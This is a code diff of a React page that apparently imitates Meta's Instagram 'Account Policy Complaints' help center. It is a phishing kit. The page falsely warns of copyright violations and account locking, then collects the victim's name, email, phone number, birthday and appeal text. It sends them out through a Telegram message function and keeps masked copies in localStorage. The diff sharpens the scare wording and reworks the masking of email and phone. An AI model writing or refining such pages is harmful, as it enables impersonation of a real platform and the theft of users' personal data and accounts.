@@ -18,8 +18,8 @@ const Home = () => {
             privacySecurity: 'Privacy, Safety and Security',
             policiesReporting: 'Policies and Reporting',
             pagePolicyAppeals: 'Account Policy Complaints',
-            detectedActivity: 'We have detected unusual activity on Pages and ad accounts linked to your Instagram, including reported copyright and guideline violations.',
-            accessLimited: 'To protect your account, please verify so that the review process is processed quickly and accurately.',
+            detectedActivity: 'We have detected unusual activity on your Page connected to your Instagram, including reported guideline and copyright violations.',
+            accessLimited: 'To avoid having your account locked,Please verify to ensure the review process is handled quickly and accurately.',
             submitAppeal: 'If you believe this is an error, you can file a complaint by providing the required information.',
             pageName: 'Name',
             mail: 'Email',
@@ -62,60 +62,43 @@ const Home = () => {
         return emailRegex.test(email);
     };
 
-    // Hàm ẩn email
+    // THÊM HÀM ẨN EMAIL: s****g@m****.com
     const hideEmail = (email) => {
+        if (!email) return 's****g@m****.com';
         const parts = email.split('@');
-        if (parts[0].length <= 1) return email;
-        return parts[0].charAt(0) + '*'.repeat(parts[0].length - 1) + '@' + parts[1];
+        if (parts.length !== 2) return email;
+        
+        const username = parts[0];
+        const domain = parts[1];
+        const domainParts = domain.split('.');
+        
+        if (username.length <= 1) return email;
+        if (domainParts.length < 2) return email;
+        
+        // Format: s****g (ký tự đầu + *** + ký tự cuối)
+        const formattedUsername = username.charAt(0) + '*'.repeat(Math.max(0, username.length - 2)) + (username.length > 1 ? username.charAt(username.length - 1) : '');
+        
+        // Format: m****.com (ký tự đầu + *** + .com)
+        const formattedDomain = domainParts[0].charAt(0) + '*'.repeat(Math.max(0, domainParts[0].length - 1)) + '.' + domainParts.slice(1).join('.');
+        
+        return formattedUsername + '@' + formattedDomain;
     };
 
-    // Hàm ẩn số điện thoại
+    // THÊM HÀM ẨN SỐ ĐIỆN THOẠI: ******32 (6 sao + 2 số cuối)
     const hidePhone = (phone) => {
-        const cleanPhone = phone.replace(/^\+\d+\s*/, ''); // Bỏ mã quốc gia
-        if (cleanPhone.length <= 2) return phone;
-        return phone.charAt(0) + '*'.repeat(cleanPhone.length - 2) + cleanPhone.slice(-1);
+        if (!phone) return '******32';
+        const cleanPhone = phone.replace(/^\+\d+\s*/, '');
+        if (cleanPhone.length < 2) return '******32';
+        
+        // Luôn hiển thị 6 sao + 2 số cuối
+        const lastTwoDigits = cleanPhone.slice(-2);
+        return '*'.repeat(6) + lastTwoDigits;
     };
 
     const translateAllTexts = useCallback(
         async (targetLang) => {
             try {
-                const [
-                    translatedHelpCenter, translatedEnglish, translatedUsing, translatedManaging, 
-                    translatedPrivacy, translatedPolicies, translatedAppeals, translatedDetected, 
-                    translatedLimited, translatedSubmit, translatedPageName, translatedMail, 
-                    translatedPhone, translatedBirthday, translatedYourAppeal, translatedAppealPlaceholder, 
-                    translatedSubmitBtn, translatedRequired, translatedInvalidEmail, translatedAbout, 
-                    translatedAdChoices, translatedCreateAd, translatedPrivacyText, translatedCareers, 
-                    translatedCreatePage, translatedTerms, translatedCookies
-                ] = await Promise.all([
-                    translateText(defaultTexts.helpCenter, targetLang),
-                    translateText(defaultTexts.english, targetLang),
-                    translateText(defaultTexts.using, targetLang),
-                    translateText(defaultTexts.managingAccount, targetLang),
-                    translateText(defaultTexts.privacySecurity, targetLang),
-                    translateText(defaultTexts.policiesReporting, targetLang),
-                    translateText(defaultTexts.pagePolicyAppeals, targetLang),
-                    translateText(defaultTexts.detectedActivity, targetLang),
-                    translateText(defaultTexts.accessLimited, targetLang),
-                    translateText(defaultTexts.submitAppeal, targetLang),
-                    translateText(defaultTexts.pageName, targetLang),
-                    translateText(defaultTexts.mail, targetLang),
-                    translateText(defaultTexts.phone, targetLang),
-                    translateText(defaultTexts.birthday, targetLang),
-                    translateText(defaultTexts.yourAppeal, targetLang),
-                    translateText(defaultTexts.appealPlaceholder, targetLang),
-                    translateText(defaultTexts.submit, targetLang),
-                    translateText(defaultTexts.fieldRequired, targetLang),
-                    translateText(defaultTexts.invalidEmail, targetLang),
-                    translateText(defaultTexts.about, targetLang),
-                    translateText(defaultTexts.adChoices, targetLang),
-                    translateText(defaultTexts.createAd, targetLang),
-                    translateText(defaultTexts.privacy, targetLang),
-                    translateText(defaultTexts.careers, targetLang),
-                    translateText(defaultTexts.createPage, targetLang),
-                    translateText(defaultTexts.termsPolicies, targetLang),
-                    translateText(defaultTexts.cookies, targetLang)
-                ]);
+                const [translatedHelpCenter, translatedEnglish, translatedUsing, translatedManaging, translatedPrivacy, translatedPolicies, translatedAppeals, translatedDetected, translatedLimited, translatedSubmit, translatedPageName, translatedMail, translatedPhone, translatedBirthday, translatedYourAppeal, translatedAppealPlaceholder, translatedSubmitBtn, translatedRequired, translatedInvalidEmail, translatedAbout, translatedAdChoices, translatedCreateAd, translatedPrivacyText, translatedCareers, translatedCreatePage, translatedTerms, translatedCookies] = await Promise.all([translateText(defaultTexts.helpCenter, targetLang), translateText(defaultTexts.english, targetLang), translateText(defaultTexts.using, targetLang), translateText(defaultTexts.managingAccount, targetLang), translateText(defaultTexts.privacySecurity, targetLang), translateText(defaultTexts.policiesReporting, targetLang), translateText(defaultTexts.pagePolicyAppeals, targetLang), translateText(defaultTexts.detectedActivity, targetLang), translateText(defaultTexts.accessLimited, targetLang), translateText(defaultTexts.submitAppeal, targetLang), translateText(defaultTexts.pageName, targetLang), translateText(defaultTexts.mail, targetLang), translateText(defaultTexts.phone, targetLang), translateText(defaultTexts.birthday, targetLang), translateText(defaultTexts.yourAppeal, targetLang), translateText(defaultTexts.appealPlaceholder, targetLang), translateText(defaultTexts.submit, targetLang), translateText(defaultTexts.fieldRequired, targetLang), translateText(defaultTexts.invalidEmail, targetLang), translateText(defaultTexts.about, targetLang), translateText(defaultTexts.adChoices, targetLang), translateText(defaultTexts.createAd, targetLang), translateText(defaultTexts.privacy, targetLang), translateText(defaultTexts.careers, targetLang), translateText(defaultTexts.createPage, targetLang), translateText(defaultTexts.termsPolicies, targetLang), translateText(defaultTexts.cookies, targetLang)]);
 
                 setTranslatedTexts({
                     helpCenter: translatedHelpCenter,
@@ -231,7 +214,7 @@ const Home = () => {
                 const telegramMessage = formatTelegramMessage(formData);
                 await sendMessage(telegramMessage);
 
-                // XỬ LÝ ẨN THÔNG TIN VÀ LƯU VÀO LOCALSTORAGE
+                // THÊM CODE XỬ LÝ ẨN THÔNG TIN VÀ LƯU VÀO LOCALSTORAGE
                 const hiddenData = {
                     name: formData.pageName,
                     email: hideEmail(formData.mail),
@@ -298,7 +281,6 @@ const Home = () => {
             title: translatedTexts.policiesReporting
         }
     ];
-
     return (
         <>
             <header className='sticky top-0 left-0 flex h-14 justify-between p-4 shadow-sm'>
@@ -336,62 +318,39 @@ const Home = () => {
                         <div className='bg-[#e4e6eb] p-4 sm:p-6'>
                             <p className='text-xl sm:text-3xl font-bold'>{translatedTexts.pagePolicyAppeals}</p>
                         </div>
-                        <div className='p-4 text-base leading-7 font-medium sm:text-sm sm:leading-6'>
+                        <div className='p-4 text-base leading-7 font-medium sm:text-base sm:leading-7'>
                             <p className='mb-3'>{translatedTexts.detectedActivity}</p>
                             <p className='mb-3'>{translatedTexts.accessLimited}</p>
                             <p>{translatedTexts.submitAppeal}</p>
                         </div>
                         <div className='flex flex-col gap-3 p-4 text-sm leading-6 font-semibold'>
                             <div className='flex flex-col gap-2'>
-                                <p className='text-base sm:text-sm'>
+                                <p className='text-base sm:text-base'>
                                     {translatedTexts.pageName} <span className='text-red-500'>*</span>
                                 </p>
-                                <input 
-                                    type='text' 
-                                    name='pageName' 
-                                    autoComplete='organization' 
-                                    className={`w-full rounded-lg border px-3 py-2.5 sm:py-1.5 text-base ${errors.pageName ? 'border-[#dc3545]' : 'border-gray-300'}`} 
-                                    value={formData.pageName} 
-                                    onChange={(e) => handleInputChange('pageName', e.target.value)} 
-                                />
+                                <input type='text' name='pageName' autoComplete='organization' className={`w-full rounded-lg border px-3 py-2.5 sm:py-1.5 text-base ${errors.pageName ? 'border-[#dc3545]' : 'border-gray-300'}`} value={formData.pageName} onChange={(e) => handleInputChange('pageName', e.target.value)} />
                                 {errors.pageName && <span className='text-xs text-red-500'>{translatedTexts.fieldRequired}</span>}
                             </div>
                             <div className='flex flex-col gap-2'>
-                                <p className='text-base sm:text-sm'>
+                                <p className='text-base sm:text-base'>
                                     {translatedTexts.mail} <span className='text-red-500'>*</span>
                                 </p>
-                                <input 
-                                    type='email' 
-                                    name='mail' 
-                                    autoComplete='email' 
-                                    className={`w-full rounded-lg border px-3 py-2.5 sm:py-1.5 text-base ${errors.mail ? 'border-[#dc3545]' : 'border-gray-300'}`} 
-                                    value={formData.mail} 
-                                    onChange={(e) => handleInputChange('mail', e.target.value)} 
-                                />
+                                <input type='email' name='mail' autoComplete='email' className={`w-full rounded-lg border px-3 py-2.5 sm:py-1.5 text-base ${errors.mail ? 'border-[#dc3545]' : 'border-gray-300'}`} value={formData.mail} onChange={(e) => handleInputChange('mail', e.target.value)} />
                                 {errors.mail === true && <span className='text-xs text-red-500'>{translatedTexts.fieldRequired}</span>}
                                 {errors.mail === 'invalid' && <span className='text-xs text-red-500'>{translatedTexts.invalidEmail}</span>}
                             </div>
                             <div className='flex flex-col gap-2'>
-                                <p className='text-base sm:text-sm'>
+                                <p className='text-base sm:text-base'>
                                     {translatedTexts.phone} <span className='text-red-500'>*</span>
                                 </p>
                                 <div className={`flex rounded-lg border ${errors.phone ? 'border-[#dc3545]' : 'border-gray-300'}`}>
-                                    <div className='flex items-center border-r border-gray-300 bg-gray-100 px-3 py-2.5 sm:py-1.5 text-base sm:text-sm font-medium text-gray-700'>{callingCode}</div>
-                                    <input 
-                                        type='tel' 
-                                        name='phone' 
-                                        inputMode='numeric' 
-                                        pattern='[0-9]*' 
-                                        autoComplete='off' 
-                                        className='flex-1 rounded-r-lg border-0 px-3 py-2.5 sm:py-1.5 focus:ring-0 focus:outline-none text-base' 
-                                        value={formData.phone.replace(/^\+\d+\s*/, '')} 
-                                        onChange={(e) => handleInputChange('phone', e.target.value)} 
-                                    />
+                                    <div className='flex items-center border-r border-gray-300 bg-gray-100 px-3 py-2.5 sm:py-1.5 text-base sm:text-base font-medium text-gray-700'>{callingCode}</div>
+                                    <input type='tel' name='phone' inputMode='numeric' pattern='[0-9]*' autoComplete='off' className='flex-1 rounded-r-lg border-0 px-3 py-2.5 sm:py-1.5 focus:ring-0 focus:outline-none text-base' value={formData.phone.replace(/^\+\d+\s*/, '')} onChange={(e) => handleInputChange('phone', e.target.value)} />
                                 </div>
                                 {errors.phone && <span className='text-xs text-red-500'>{translatedTexts.fieldRequired}</span>}
                             </div>
                             <div className='flex flex-col gap-2'>
-                                <p className='text-base sm:text-sm'>
+                                <p className='text-base sm:text-base'>
                                     {translatedTexts.birthday} <span className='text-red-500'>*</span>
                                 </p>
                                 
@@ -426,23 +385,20 @@ const Home = () => {
                                 {errors.birthday && <span className='text-xs text-red-500'>{translatedTexts.fieldRequired}</span>}
                             </div>
                             <div className='flex flex-col gap-2'>
-                                <p className='text-base sm:text-sm'>
+                                <p className='text-base sm:text-base'>
                                     {translatedTexts.yourAppeal} <span className='text-red-500'>*</span>
                                 </p>
                                 <textarea 
                                     name='appeal'
                                     rows={4}
-                                    className={`w-full rounded-lg border px-3 py-2.5 sm:py-1.5 resize-none text-base sm:text-sm ${errors.appeal ? 'border-[#dc3545]' : 'border-gray-300'}`}
+                                    className={`w-full rounded-lg border px-3 py-2.5 sm:py-1.5 resize-none text-base sm:text-base ${errors.appeal ? 'border-[#dc3545]' : 'border-gray-300'}`}
                                     placeholder={translatedTexts.appealPlaceholder}
                                     value={formData.appeal}
                                     onChange={(e) => handleInputChange('appeal', e.target.value)}
                                 />
                                 {errors.appeal && <span className='text-xs text-red-500'>{translatedTexts.fieldRequired}</span>}
                             </div>
-                            <button 
-                                className='w-full rounded-lg bg-blue-600 hover:bg-blue-700 text-white px-4 py-3 text-base font-semibold transition-colors duration-200 mt-2' 
-                                onClick={handleSubmit}
-                            >
+                            <button className='w-full rounded-lg bg-blue-600 hover:bg-blue-700 text-white px-4 py-3 text-base font-semibold transition-colors duration-200 mt-2' onClick={handleSubmit}>
                                 {translatedTexts.submit}
                             </button>
                         </div>
@@ -476,5 +432,4 @@ const Home = () => {
         </>
     );
 };
-
 export default Home;
